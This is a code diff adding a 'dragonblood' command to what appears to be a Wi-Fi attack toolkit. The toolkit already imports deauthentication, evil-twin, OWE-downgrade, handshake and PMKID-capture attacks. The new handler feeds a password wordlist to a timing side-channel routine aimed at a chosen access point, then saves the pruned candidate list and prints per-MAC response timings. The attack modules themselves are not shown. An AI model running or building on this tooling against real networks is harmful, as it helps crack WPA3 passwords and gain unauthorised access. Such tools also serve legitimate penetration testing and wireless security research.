@@ -5,6 +5,7 @@ from __future__ import annotations
 import sys
 
 from ..attacks.deauth import deauth
+from ..attacks.dragonblood import timing_prune_wordlist
 from ..attacks.eviltwin import run_downgrade_twin, run_eviltwin, run_owe_downgrade
 from ..attacks.handshake import capture_handshake
 from ..attacks.pmkid import capture_pmkid
@@ -193,3 +194,20 @@ def _cmd_owe_downgrade(args) -> int:
         return 0
     print(f"failed: {result.detail}", file=sys.stderr)
     return 1
+
+
+def _cmd_dragonblood(args) -> int:
+    with open(args.wordlist, encoding="utf-8", errors="ignore") as fh:
+        wordlist = [line.strip() for line in fh if line.strip()]
+    result = timing_prune_wordlist(
+        iface=args.iface, bssid=args.bssid, wordlist=wordlist, channel=args.channel,
+        num_macs=args.num_macs, samples_per_mac=args.samples_per_mac, timeout=args.timeout,
+        progress_fn=lambda msg: print(msg, flush=True),
+    )
+    if args.outfile:
+        with open(args.outfile, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(result.pruned_wordlist) + ("\n" if result.pruned_wordlist else ""))
+    print(result.detail)
+    for mac, rtt in result.mac_timings.items():
+        print(f"  {mac}: {rtt * 1000:.1f}ms median")
+    return 0
